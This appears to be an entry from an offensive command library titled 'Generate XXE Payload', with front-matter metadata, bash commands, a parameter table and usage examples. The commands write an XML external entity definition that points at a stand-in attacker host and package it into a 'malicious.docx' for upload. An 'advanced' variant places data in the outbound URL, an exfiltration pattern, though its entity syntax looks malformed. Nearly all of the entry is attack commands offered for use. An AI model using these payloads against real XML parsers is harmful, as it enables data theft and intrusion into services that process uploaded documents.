---
data: >-
  echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker-controlled.dns/"
  >]>' > payload.dtd

  zip malicious.docx payload.dtd
tags:
  - xxe
  - payload
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: cdc5c588-bf4d-45f9-a2f0-41985086b286
created_at: '2025-12-13T09:00:27.629Z'
updated_at: '2025-12-13T09:00:27.629Z'
verified: false
validated: true
submitted: true
---
# Generate XXE Payload

## Command

```bash
echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker-controlled.dns/" >]>' > payload.dtd
zip malicious.docx payload.dtd
```

## Description

This command creates a DTD file with an XXE entity and packages it into a docx file for exploitation in XML parsers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo content` | DTD payload string | Yes |
| `zip file` | Output docx file | Yes |

## Examples

### Basic Usage

```bash
echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.dns/" >]>' > payload.dtd
zip malicious.docx payload.dtd
```

### Advanced Usage

```bash
echo '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.dns/%(data);"> %xxe; ]>' > payload.dtd
zip -u malicious.docx payload.dtd
```

## Expected Output

A zipped docx file containing the XXE payload, ready for upload.

## Related

- [[procedures/Craft-Malicious-XML-Document-Payload]]
